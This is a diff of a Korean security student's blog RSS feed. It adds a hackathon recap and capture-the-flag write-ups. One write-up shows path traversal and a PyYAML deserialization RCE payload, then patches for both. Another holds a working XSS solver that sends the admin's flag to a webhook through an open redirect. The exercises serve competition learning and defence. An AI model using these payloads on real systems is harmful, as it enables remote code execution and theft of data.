@@ -1,4 +1,127 @@
-<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>nullbyte_</title><description>My Blog</description><link>https://itznullbyte.github.io/</link><language>en</language><item><title>2025 U+ Security Hackathon Quals Write-Up</title><link>https://itznullbyte.github.io/posts/uplus_hackathon/</link><guid isPermaLink="true">https://itznullbyte.github.io/posts/uplus_hackathon/</guid><description> </description><pubDate>Sun, 28 Sep 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;Write-Up&lt;/h2&gt;
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>nullbyte</title><description>My Blog</description><link>https://itznullbyte.github.io/</link><language>en</language><item><title>2025 U+ Security Hackathon Final 후기</title><link>https://itznullbyte.github.io/posts/uplus_hackathon_final/</link><guid isPermaLink="true">https://itznullbyte.github.io/posts/uplus_hackathon_final/</guid><description> </description><pubDate>Sun, 26 Oct 2025 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;&lt;a href=&quot;https://dreamhack.io/users/37706&quot;&gt;le0s1mba&lt;/a&gt;, &lt;a href=&quot;https://dreamhack.io/users/53840&quot;&gt;yeonba&lt;/a&gt;, &lt;a href=&quot;https://dreamhack.io/users/33534&quot;&gt;btb&lt;/a&gt; 세명컴고 팀원 3명이랑 &lt;code&gt;대성없는 대성팀&lt;/code&gt;으로 예선 턱걸이해서 어찌저찌 본선에 갔다왔다.&lt;/p&gt;
+&lt;p&gt;결과부터 말하자면 예선과 본선 모두 그리 좋지 못한 성적으로 털려버렸다. 재미있게 즐기고 오긴했는데 팀원들한테 민폐끼친거 같아 죄송하다 ㅠㅠ&lt;/p&gt;
+&lt;h3&gt;대회장&lt;/h3&gt;
+&lt;p&gt;10월 24일에 본선이 열렸다. 하필 내 고등학생으로써의 마지막 학교 축제랑 겹치긴 했는데 뭐 LG 본선 정도면 빠지고 갈 이유가 충분했다.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./1.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;6시에 일어나서 지하철 타고 마곡나루로 갔고 LG 마곡사옥에 도착했다.&lt;br /&gt;
+다른 대회들이랑 다르게 뭘 많이 줘서 좋았다. 무탠다드 후드집업이랑 스티커랑 그런거 받았는데 입고 다녀도 될 거 같다.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./2.jpg&quot; alt=&quot;&quot; /&gt;
+&lt;img src=&quot;./3.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;팀명따라서 대성형 프사를 팀 로고로 박았다&lt;/p&gt;
+&lt;h3&gt;Live fire&lt;/h3&gt;
+&lt;p&gt;처음에 개회사랑 대회 일정 설명 듣고 바로 대회 시작했다.&lt;/p&gt;
+&lt;p&gt;대회는 &lt;code&gt;Live fire&lt;/code&gt;, &lt;code&gt;Scenario&lt;/code&gt;, &lt;code&gt;Jeopardy&lt;/code&gt; 세 분야가 출제 되었다. CCE 이후로 공방전은 볼 일 없을줄 알았는데 갑자기 나와서 당황했다.
+다 그렇듯이 취약한 웹서버가 하나씩 주어지고 15분 주기로 운영진 측에서 공격한다. 취약점 7개 숨어있는거 패치해서 업로드하면 됐다.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;Golang + 파이썬&lt;/code&gt; 기반 서버가 주어졌는데 파일 수가 CCE때보다 많았다.. 아마 대충 40개는 되었을거다.
+다들 금방 취약점 한두개씩은 패치했는데 고랭 보고 쫄아버린 나는 시작한지 3시간쯤 지나서야 sqli 하나를 패치했고 대회 후반에 LLM 힘을 빌려 취약점 2개를 더 방어하면서 총 3개를 방어할 수 있었다.
+결과가 그런거지 패치를 진짜 늦게하고 중간에 SLA Failed 뜬 것도 꽤 있어서 얘가 점수를 진짜 많이 깎아먹었다.&lt;/p&gt;
+&lt;h3&gt;JeoPardy&lt;/h3&gt;
+&lt;p&gt;고등학생, 대학생들 다 나온 대회다 보니 모든 분야가 고난이도로 출제 되었다.&lt;/p&gt;
+&lt;p&gt;내가 잡았던 웹은 2문제가 나왔으며 각각 4솔, 0솔이었다.&lt;/p&gt;
+&lt;p&gt;첫번째 문제 대충 기억나는대로 설명을 해보겠다.&lt;/p&gt;
+&lt;p&gt;내부망이랑 외부망이 분리되어있으며 내부, 외부 모두 게시판 기능을 하는 서버가 돌아가고있다.
+외부망에선 내부망으로 POST 요청 보낼 수 있는 api를 제공하고 있었고, 내부망 게시판에 있는 flag를 읽는게 목표였다&lt;/p&gt;
+&lt;p&gt;csp, csrf, origin check 등 여러 문제때문에 외부망 xss -&amp;gt; 내부망 xss (+ csrf bypass, csp bypass) 해서 admin bot 옮겨 flag 읽어와주면 되었다.&lt;/p&gt;
+&lt;p&gt;익스 방향은 맞았지만 csp bypass를 제대로 못했다 ㅠㅠ 집와서 코드 한 줄 추가해 돌려보니 잘 읽어와지더라..&lt;/p&gt;
+&lt;h3&gt;After party&lt;/h3&gt;
+&lt;p&gt;대회 끝나고 네트워킹 파티 했다. 조는 신청한 사람들 중에 랜덤으로 정해졌고 우리 테이블에는 가끔 드림핵이랑 대회에서 만나던 두 분과 LG 멘토님, 대학생 한 분 이렇게 계셨다.
+같이 밥먹고 소소한 활동하고 했는데 재미있었다.&lt;/p&gt;
+&lt;p&gt;난 적당히 내향적인지라 대화에 많이 참여하고 그런건 없었지만 중간중간 진로 상담도 받았고 현업에 계신 다른분들 얘기 들으니 확실히 인사이트가 쌓이는 느낌이 들었다.&lt;/p&gt;
+&lt;p&gt;암튼 좋은 경험이었다. 다음 대회때는 수상을 목표로 해보도록하겠다.&lt;/p&gt;
+</content:encoded></item><item><title>Whitehat Contest Quals Write-Up</title><link>https://itznullbyte.github.io/posts/2025_withcon/</link><guid isPermaLink="true">https://itznullbyte.github.io/posts/2025_withcon/</guid><description> </description><pubDate>Sun, 19 Oct 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h3&gt;서론&lt;/h3&gt;
+&lt;p&gt;예선에 웹 문제 좀만 더 내주면 좋겠다. 두 문제 풀고 할 거 없어서 하지도 못하는 포렌식 잡느라 힘들었다.&lt;/p&gt;
+&lt;p&gt;예선에선 다 리얼월드 형태의 문제들이 출제 되었다. 한 가지 시나리오를 가지고 1에서 5번까지의 시나리오 문제를 풀어내야 했고
+공격자 침투 경로 따라서 플래그 따주면 된다.
+웹 요소가 포함 되어있는건 &lt;code&gt;시나리오 1-1 ~ 1-5&lt;/code&gt; 문제였는데, 이것도 1-1, 1-2만 웹이고 나머지는 리버싱 암호학 등이다.&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h3&gt;Scenario 1-1&lt;/h3&gt;
+&lt;p&gt;공격자가 서버의 취약점을 가지고 셸을 땄다고 한다. 우리도 똑같이 침투해서 서버내에 있는 플래그를 얻어야한다.&lt;/p&gt;
+&lt;p&gt;접속해보면 공공 데이터 공유 서비스가 있고 딱봐도 수상해보이는 download 기능이 있다.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;http://54.180.78.10/download?file=traffic.json&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;LFI가 터지므로 여기서 적당히 게싱해서 아래 파일들을 읽어온다.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;/app/app.py&lt;/li&gt;
+&lt;li&gt;/app/route/theme.py&lt;/li&gt;
+&lt;li&gt;/app/route/file.py&lt;/li&gt;
+&lt;li&gt;/app/Dockerfile&lt;/li&gt;
+&lt;li&gt;/app/requirements.txt&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;중요한 파일 내용만 보자면&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;COPY . $APP_HOME
+RUN FLAG_CONTENT=$(cat $APP_HOME/flag.txt) &amp;amp;&amp;amp; \
+    echo &quot;$FLAG_CONTENT&quot; &amp;gt; &quot;/$FLAG_CONTENT&quot; &amp;amp;&amp;amp; \
+    chmod 400 &quot;/$FLAG_CONTENT&quot; &amp;amp;&amp;amp; \
+    chown root:root &quot;/$FLAG_CONTENT&quot; &amp;amp;&amp;amp; \
+    rm $APP_HOME/flag.txt
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;플래그 자체가 파일명이 되어 루트 경로로 들어가 있다.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Flask==3.0.3
+PyYAML==5.3.1
+gunicorn==23.0.0
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;PyYAML 모듈이 5.3.1 구버전이라 RCE CVE가 존재한다.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;@theme_bp.post(&quot;/api/theme/preview&quot;)
+def preview_theme():
+    body = request.data.decode(&quot;utf-8&quot;, &quot;ignore&quot;)
+    if len(body) &amp;gt; 2**7:
+        return jsonify({&quot;error&quot;: &quot;Body is too long&quot;})
+    try:
+        parsed: Any = yaml.load(body, Loader=yaml.FullLoader)
+
+        colors: Dict[str, str] = {}
+        if isinstance(parsed, dict) and isinstance(parsed.get(&quot;colors&quot;), dict):
+            colors = {
+                &quot;primary&quot;: str(parsed[&quot;colors&quot;].get(&quot;primary&quot;, &quot;#336699&quot;)),
+                &quot;accent&quot;: str(parsed[&quot;colors&quot;].get(&quot;accent&quot;, &quot;#88aadd&quot;)),
+            }
+        write_theme_css(colors)
+    except Exception:
+        write_theme_css({&quot;primary&quot;: &quot;#336699&quot;, &quot;accent&quot;: &quot;#88aadd&quot;})
+
+    try:
+        return jsonify({&quot;ok&quot;: repr(parsed)})
+    except Exception:
+        return jsonify({&quot;error&quot;: &quot;Failed to parse YAML&quot;})
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;theme.py&lt;/code&gt;에서 &lt;code&gt;load()&lt;/code&gt;를 사용하고 있으므로 취약점을 트리거 할 수 있다.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;import yaml
+import requests
+import time
+import base64
+
+url = &apos;http://54.180.78.10/api/theme/preview&apos;
+
+def exploit():
+  payload1 = f&quot;&quot;&quot;!!python/object/new:tuple [!!python/object/new:map [!!python/name:eval , [&apos;__import__(&quot;os&quot;).listdir(&quot;/&quot;)&apos;]]]&quot;&quot;&quot;
+  print(len(payload1))
+  res = requests.post(url, data = payload1)
+  print(res.json())
+
+exploit()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;이런식으로 루트 경로 읽어와주면 된다.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;whitehat2025{dc50ad05f7db236ea24f3c8258289ecf839412025e0b84b0619de24e77f3de93}&lt;/code&gt;&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h3&gt;Scenario 1-2&lt;/h3&gt;
+&lt;p&gt;이제 여기서 찾은 취약점들을 패치하면 플래그를 준다.&lt;/p&gt;
+&lt;p&gt;간단해서 딱히 설명할것도 없다.&lt;/p&gt;
+&lt;h4&gt;LFI 패치&lt;/h4&gt;
+&lt;pre&gt;&lt;code&gt;@files_bp.get(&quot;/download&quot;)
+def download_file():
+    rel = request.args.get(&quot;file&quot;, &quot;&quot;)
+    full_path = os.path.join(BASE_DIR, rel)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;rel = request.args.get(&quot;file&quot;, &quot;&quot;)
+rel = rel.replace(&quot;..&quot;, &quot;&quot;)
+rel = rel.replace(&quot;/&quot;, &quot;&quot;)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;어차피 서버에서 요구하는건 파일명이므로 &lt;code&gt;/&lt;/code&gt; &lt;code&gt;..&lt;/code&gt; 다 제거시켜주면 된다.&lt;/p&gt;
+&lt;h4&gt;RCE 패치&lt;/h4&gt;
+&lt;p&gt;이건 그냥 모듈에서 &lt;code&gt;safe_load&lt;/code&gt;라는걸 지원한다.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;parsed: Any = yaml.safe_load(body)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;whitehat2025{b8b18dae5b0aed7d538d030604fbaeb6e1ac1960de20e06e01daa21b9627f113}&lt;/code&gt;&lt;/p&gt;
+</content:encoded></item><item><title>2025 U+ Security Hackathon Quals Write-Up</title><link>https://itznullbyte.github.io/posts/uplus_hackathon/</link><guid isPermaLink="true">https://itznullbyte.github.io/posts/uplus_hackathon/</guid><description> </description><pubDate>Sun, 28 Sep 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;Write-Up&lt;/h2&gt;
 &lt;h3&gt;compound interest&lt;/h3&gt;
 &lt;p&gt;&lt;img src=&quot;./first.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;메모 기능에서 SSTI가 터져 RCE 할 수 있다&lt;/p&gt;
@@ -150,6 +273,99 @@ Content-Type: image/png
 &lt;p&gt;&lt;code&gt;http://3.36.14.255:3000/report?path=uploads/3f64fdf5-529b-4b00-94c2-e5b90819c473/...png&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;&lt;img src=&quot;./webhook.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;lguplus2025{50eb1bcbe258aff5e32155c406aa24df}&lt;/code&gt;&lt;/p&gt;
+</content:encoded></item><item><title>2025 Crew CTF - Loves Note</title><link>https://itznullbyte.github.io/posts/crewctf/</link><guid isPermaLink="true">https://itznullbyte.github.io/posts/crewctf/</guid><description> </description><pubDate>Fri, 26 Sep 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;TL;DR&lt;/h2&gt;
+&lt;p&gt;meta 기반 Open Redirect와 XSS를 통해 CSP가 없는 게시글로 봇을 유도, admin 게시글에 있는 flag를 탈취하는 문제이다.&lt;/p&gt;
+&lt;h2&gt;Description&lt;/h2&gt;
+&lt;p&gt;로그인하면 notes를 작성할 수 있는 페이지와, 리포트 기능이 존재한다는 걸 알 수 있다.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;const reviewNote = async (reviewNoteId) =&amp;gt; {
+    const showNoteDiv = document.getElementById(&apos;show-note&apos;);
+    const response = await fetch(`/api/notes/`+reviewNoteId)
+    const note = await response.text();
+    showNoteDiv.style.display = &apos;block&apos;;
+    
+    showNoteDiv.innerHTML = `
+        &amp;lt;h3&amp;gt;Note ID: ${reviewNoteId}&amp;lt;/h3&amp;gt;
+        &amp;lt;p&amp;gt;${note}&amp;lt;/p&amp;gt;
+    `;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;// Review note
+await sleep(2000);
+try{
+    await page.goto(HOSTNAME + &apos;/dashboard?reviewNote=&apos;+noteId);
+} catch(error) {
+    console.log(error);
+}
+await sleep(2000);
+try{page.close()} catch{};
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;봇은 &lt;code&gt;?reviewNote&lt;/code&gt;를 사용해 게시글을 읽어온다.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;res.setHeader(&apos;Content-Security-Policy&apos;, `script-src ${HOSTNAME}/static/dashboard.js https://js.hcaptcha.com/1/api.js; style-src ${HOSTNAME}/static/; img-src &apos;none&apos;; connect-src &apos;self&apos;; media-src &apos;none&apos;; object-src &apos;none&apos;; prefetch-src &apos;none&apos;; frame-ancestors &apos;none&apos;; form-action &apos;self&apos;; frame-src &apos;none&apos;;`);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;전역적으로 CSP 정책이 엄격하게 설정되어 있어 바로 flag를 획득하는 건 불가능하지만, &lt;code&gt;/api/notes/{noteId}&lt;/code&gt;에서 취약점이 발생한다.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;// Look mom, I wrote a raw HTTP response all by myself!
+// Can I go outside now and play with my friends?
+const responseMessage = `HTTP/1.1 200 OK
+Date: Sun, 7 Nov 1917 11:26:07 GMT
+Last-Modified: the-second-you-blinked
+Type: flag-extra-salty, thanks
+Length: 1337 bytes of pain
+Server: thehackerscrew/1970 
+Cache-Control: never-ever-cache-this
+Allow: pizza, hugs, high-fives
+X-CTF-Player-Reminder: drink-water-and-keep-hydrated
+
+${note.title}: ${note.content}
+
+`
+res.socket.end(responseMessage)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;/api/notes/{noteId}&lt;/code&gt; 라우트는 서버에서 Raw HTTP 패킷을 직접 만들어 응답을 보내는데, &lt;code&gt;responseMessage&lt;/code&gt;에서 어떠한 CSP 헤더도 설정되어 있지 않기에 문제 없이 인라인 스크립트를 실행할 수 있다.&lt;/p&gt;
+&lt;p&gt;다음과 같은 방법으로 플래그를 leak한다.&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;code&gt;/dashboard?reviewNote&lt;/code&gt;에서 &lt;code&gt;/api/notes/{noteId}&lt;/code&gt;로의 Meta tag Open Redirect&lt;/li&gt;
+&lt;li&gt;XSS를 통한 웹훅 서버로의 전송&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;필자는 &lt;code&gt;/api/notes&lt;/code&gt;에서 플래그를 파싱해 보내는 방법을 사용했다.&lt;/p&gt;
+&lt;h2&gt;Solver&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;import requests
+
+r = requests.Session()
+
+url = &apos;https://inst-ca0cfd06b8022715-love-notes.chal.crewc.tf&apos;
+webhook = &apos;https://vuebjrp.request.dreamhack.games&apos;
+
+def save_note(title, content):
+  res = r.post(f&apos;{url}/api/notes&apos;, data = { &quot;title&quot;: title, &quot;content&quot;: content })
+  return res.json()
+
+def register():
+  res = r.post(f&apos;{url}/api/auth/register&apos;, data = { &quot;email&quot;: &quot;test&quot;, &quot;password&quot;: &quot;test&quot; })
+  print(res.text)
+
+def login():
+  res = r.post(f&apos;{url}/api/auth/login&apos;, data = { &quot;email&quot;: &quot;test&quot;, &quot;password&quot;: &quot;test&quot; })
+  print(res.text)
+
+def report(note_id):
+  res = r.post(f&apos;{url}/report&apos;, data = { &quot;noteId&quot;: note_id })
+  print(res.text)
+
+register()
+login()
+
+# Script file save
+payload = f&apos;fetch(&quot;/api/notes/&quot;).then(r =&amp;gt; r.text()).then(rtext =&amp;gt; location.href = &quot;{webhook}?q=&quot; + &quot;crew&quot; + (rtext.split(&quot;crew&quot;)[1].split(&quot;}}&quot;)[0]) + &quot;}}&quot;)//&apos;
+script_note_id = save_note(payload, &apos;//&apos;)[&apos;id&apos;]
+
+# Get Script file
+script_note_id_2 = save_note(f&apos;&amp;lt;script src=&quot;{url}/api/notes/{script_note_id}&quot;&amp;gt;&amp;lt;/script&amp;gt;&apos;, &apos;test1&apos;)[&apos;id&apos;]
+
+# ?reviewNote open redirect -&amp;gt; script -&amp;gt; execute
+open_redirect = save_note(f&apos;&amp;lt;html&amp;gt;&amp;lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=/api/notes/{script_note_id_2} &quot;/&amp;gt;&amp;lt;/html&amp;gt;&apos;, &apos;test2&apos;)[&apos;id&apos;]
+
+report(open_redirect)
+&lt;/code&gt;&lt;/pre&gt;
 </content:encoded></item><item><title>2025 YISF, HackQuest 후기</title><link>https://itznullbyte.github.io/posts/yisf_kaist_final/</link><guid isPermaLink="true">https://itznullbyte.github.io/posts/yisf_kaist_final/</guid><description> </description><pubDate>Tue, 09 Sep 2025 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;이전에 썼던 Write-Up 글들을 보신분들은 알겠지만 이번에 열린 순천향대 정보보호 페스티벌, Kaist Hackquest 본선에 다녀왔습니다&lt;/p&gt;
 &lt;p&gt;후기 적어보겠습니다&lt;/p&gt;
 &lt;hr /&gt;
@@ -887,7 +1103,7 @@ for i in range(0x20, 0x3000):
 &lt;p&gt;이번에도 역시 sqli가 발목을 잡았다.
 다른 취약점들도 시간이 걸리긴 했지만 꽤 쉽게 알아챘던거 같은데 SQL 인젝션은 지피티랑 씨름해서 겨우 페이로드 얻었다&lt;/p&gt;
 &lt;p&gt;제발 이번에 1인분만 하길..&lt;/p&gt;
-</content:encoded></item><item><title>2025 HackQuest [Simple Note] Write-Up</title><link>https://itznullbyte.github.io/posts/hackquest/</link><guid isPermaLink="true">https://itznullbyte.github.io/posts/hackquest/</guid><description> </description><pubDate>Tue, 22 Jul 2025 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;카이스트에서 주최한 HackQuest에 참가했고 웹 4문제 중 3문제를 풀었다.&lt;br /&gt;
+</content:encoded></item><item><title>2025 HackQuest - Simple Note</title><link>https://itznullbyte.github.io/posts/hackquest/</link><guid isPermaLink="true">https://itznullbyte.github.io/posts/hackquest/</guid><description> </description><pubDate>Tue, 22 Jul 2025 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;카이스트에서 주최한 HackQuest에 참가했고 웹 4문제 중 3문제를 풀었다.&lt;br /&gt;
 못 푼 한 문제가 아래에서 설명할 &lt;code&gt;Simple Note&lt;/code&gt;보다 쉬운 문제였지만 헤메다 풀지 못했다.&lt;/p&gt;
 &lt;h2&gt;Simple Note (Web)&lt;/h2&gt;
 &lt;pre&gt;&lt;code&gt;app.get(&apos;/track&apos;, (req, res) =&amp;gt; {
